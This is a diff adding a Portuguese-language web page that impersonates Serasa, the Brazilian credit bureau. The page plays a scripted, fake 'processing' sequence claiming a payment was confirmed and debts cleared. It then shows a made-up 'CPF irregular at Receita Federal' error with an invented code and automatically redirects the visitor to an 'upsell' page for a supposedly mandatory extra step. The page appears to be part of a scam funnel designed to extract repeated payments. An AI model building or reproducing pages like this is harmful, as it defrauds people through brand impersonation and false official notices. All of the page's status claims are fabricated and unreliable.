@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script src="../js/utmify-utm.js" defer></script>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Processando - Serasa</title>
+  <style>
+    *, ::before, ::after { box-sizing: border-box; margin: 0; padding: 0 }
+    html, body {
+      height: 100%;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", sans-serif;
+      background: #1e2433;
+      color: #fff;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    .page {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+
+    /* Logo */
+    .logo-wrap {
+      margin-bottom: 40px;
+    }
+    .logo-wrap svg text { font-family: Arial, sans-serif; font-weight: 700; }
+
+    /* Card */
+    .card {
+      background: #fff;
+      border-radius: 16px;
+      width: 100%;
+      max-width: 420px;
+      padding: 36px 28px;
+      text-align: center;
+      box-shadow: 0 8px 40px rgba(0,0,0,.35);
+    }
+
+    /* Spinner */
+    .spinner-wrap {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 28px;
+    }
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border: 5px solid #f3e0ea;
+      border-top-color: #ec0978;
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg) } }
+
+    /* Steps */
+    .step-title {
+      color: #0f172a;
+      font-size: 18px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      min-height: 28px;
+      transition: opacity .3s;
+    }
+    .step-sub {
+      color: #6b7280;
+      font-size: 13px;
+      margin-bottom: 28px;
+      min-height: 20px;
+    }
+    .steps-list {
+      list-style: none;
+      text-align: left;
+      border-top: 1px solid #f1f5f9;
+      padding-top: 20px;
+    }
+    .steps-list li {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 13px;
+      color: #6b7280;
+      padding: 8px 0;
+      border-bottom: 1px solid #f1f5f9;
+      transition: color .3s;
+    }
+    .steps-list li.done { color: #15803d; }
+    .steps-list li.active { color: #ec0978; font-weight: 600; }
+
+    .icon {
+      width: 20px;
+      height: 20px;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .icon-pending { color: #d1d5db; }
+    .icon-active  { color: #ec0978; }
+    .icon-done    { color: #15803d; }
+
+    /* Error state */
+    .error-wrap { display: none; }
+    .error-icon {
+      width: 64px;
+      height: 64px;
+      background: #fef2f2;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+    }
+    .error-icon svg { color: #dc2626; }
+    .error-title {
+      color: #dc2626;
+      font-size: 20px;
+      font-weight: 700;
+      margin-bottom: 10px;
+    }
+    .error-code {
+      background: #fef2f2;
+      border: 1px solid #fecaca;
+      border-radius: 8px;
+      padding: 12px 16px;
+      font-size: 13px;
+      color: #7f1d1d;
+      margin-bottom: 16px;
+      text-align: left;
+    }
+    .error-code strong { display: block; margin-bottom: 4px; font-size: 12px; color: #991b1b; }
+    .error-desc {
+      color: #6b7280;
+      font-size: 13px;
+      margin-bottom: 20px;
+    }
+    .redirect-bar-wrap {
+      background: #f8fafc;
+      border-radius: 8px;
+      padding: 10px 14px;
+      margin-bottom: 8px;
+    }
+    .redirect-bar-label {
+      font-size: 11px;
+      color: #6b7280;
+      margin-bottom: 6px;
+    }
+    .redirect-bar {
+      height: 4px;
+      background: #e2e8f0;
+      border-radius: 4px;
+      overflow: hidden;
+    }
+    .redirect-bar-fill {
+      height: 100%;
+      background: #ec0978;
+      border-radius: 4px;
+      width: 0%;
+      transition: width 6s linear;
+    }
+    .redirect-note {
+      font-size: 11px;
+      color: #9ca3af;
+    }
+
+    /* Loading state */
+    .loading-wrap { display: block; }
+  </style>
+</head>
+<body>
+<div class="page">
+
+  <div class="logo-wrap">
+    <svg width="140" height="36" viewBox="0 0 180 50" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <rect width="180" height="50" rx="8" fill="#ec0978"/>
+      <text x="90" y="34" font-size="22" fill="white" text-anchor="middle">SERASA</text>
+    </svg>
+  </div>
+
+  <div class="card">
+
+    <!-- LOADING STATE -->
+    <div class="loading-wrap" id="loadingWrap">
+      <div class="spinner-wrap">
+        <div class="spinner"></div>
+      </div>
+      <div class="step-title" id="stepTitle">Confirmando pagamento...</div>
+      <div class="step-sub" id="stepSub">Aguarde, isso pode levar alguns segundos</div>
+      <ul class="steps-list" id="stepsList">
+        <li id="s1" class="active">
+          <span class="icon icon-active">
+            <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          </span>
+          Confirmando pagamento recebido
+        </li>
+        <li id="s2">
+          <span class="icon icon-pending">
+            <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          </span>
+          Regularizando dívidas no sistema
+        </li>
+        <li id="s3">
+          <span class="icon icon-pending">
+            <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/></svg>
+          </span>
+          Iniciando procedimento de limpeza
+        </li>
+        <li id="s4">
+          <span class="icon icon-pending">
+            <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/></svg>
+          </span>
+          Atualizando cadastro na Receita Federal
+        </li>
+        <li id="s5">
+          <span class="icon icon-pending">
+            <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/></svg>
+          </span>
+          Emitindo comprovante de quitação
+        </li>
+      </ul>
+    </div>
+
+    <!-- ERROR STATE -->
+    <div class="error-wrap" id="errorWrap">
+      <div class="error-icon">
+        <svg width="32" height="32" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24" color="#dc2626">
+          <circle cx="12" cy="12" r="10"/>
+          <line x1="12" y1="8" x2="12" y2="12"/>
+          <circle cx="12" cy="16" r=".5" fill="currentColor"/>
+        </svg>
+      </div>
+      <div class="error-title">CPF Irregular na Receita Federal</div>
+      <div class="error-code">
+        <strong>CÓDIGO DE IRREGULARIDADE: RF-4872-CPF</strong>
+        Seu CPF consta com pendências adicionais na base da Receita Federal que impedem a conclusão total da regularização via Serasa.
+      </div>
+      <div class="error-desc">
+        Para regularização completa e definitiva do seu CPF, você será direcionado para uma etapa complementar obrigatória.
+      </div>
+      <div class="redirect-bar-wrap">
+        <div class="redirect-bar-label">Redirecionando para próxima etapa...</div>
+        <div class="redirect-bar">
+          <div class="redirect-bar-fill" id="redirectBar"></div>
+        </div>
+      </div>
+      <div class="redirect-note">Você será redirecionado automaticamente em instantes</div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+  // Pega todos os params da URL para repassar
+  var params = new URLSearchParams(window.location.search);
+
+  // Guard: só pode vir aqui se veio do pagamento aprovado
+  if (!params.get('funil_ok')) {
+    // Redireciona de volta para pagamento mantendo os params
+    var backUrl = new URL('/pagamento/', window.location.origin);
+    params.forEach(function(v, k) { if (k !== 'funil_ok') backUrl.searchParams.set(k, v); });
+    window.location.replace(backUrl.toString());
+  }
+
+  function setStepDone(id) {
+    var el = document.getElementById(id);
+    if (!el) return;
+    el.className = 'done';
+    el.querySelector('.icon').className = 'icon icon-done';
+    el.querySelector('.icon').innerHTML = '<svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="9 12 11 14 15 10"/></svg>';
+  }
+
+  function setStepActive(id, title, sub) {
+    var el = document.getElementById(id);
+    if (!el) return;
+    el.className = 'active';
+    el.querySelector('.icon').className = 'icon icon-active';
+    el.querySelector('.icon').innerHTML = '<svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>';
+    if (title) document.getElementById('stepTitle').textContent = title;
+    if (sub) document.getElementById('stepSub').textContent = sub;
+  }
+
+  function showError() {
+    document.getElementById('loadingWrap').style.display = 'none';
+    document.getElementById('errorWrap').style.display = 'block';
+
+    // Inicia barra de progresso
+    setTimeout(function() {
+      document.getElementById('redirectBar').style.width = '100%';
+    }, 100);
+
+    // Redireciona após 6s
+    setTimeout(function() {
+      var target = new URL('/upsell/1/', window.location.origin);
+      params.forEach(function(v, k) { target.searchParams.set(k, v); });
+      target.searchParams.set('funil_ok', '1');
+      window.location.href = target.toString();
+    }, 6200);
+  }
+
+  // Sequência de steps
+  var seq = [
+    { delay: 0,    active: 's1', done: null,  title: 'Confirmando pagamento...',              sub: 'Aguarde, isso pode levar alguns segundos' },
+    { delay: 1800, active: 's2', done: 's1',  title: 'Regularizando dívidas no sistema...',   sub: 'Comunicando com o banco de dados Serasa' },
+    { delay: 3800, active: 's3', done: 's2',  title: 'Iniciando procedimento de limpeza...',  sub: 'Processando acordo 83N2L618362E' },
+    { delay: 5800, active: 's4', done: 's3',  title: 'Atualizando cadastro...',               sub: 'Sincronizando com a Receita Federal' },
+    { delay: 7800, active: 's5', done: 's4',  title: 'Emitindo comprovante...',               sub: 'Quase pronto, aguarde' },
+    { delay: 9800, active: null, done: 's5',  title: null, sub: null, end: true },
+  ];
+
+  seq.forEach(function(step) {
+    setTimeout(function() {
+      if (step.done) setStepDone(step.done);
+      if (step.active) setStepActive(step.active, step.title, step.sub);
+      if (step.end) showError();
+    }, step.delay);
+  });
+</script>
+</body>
+</html>
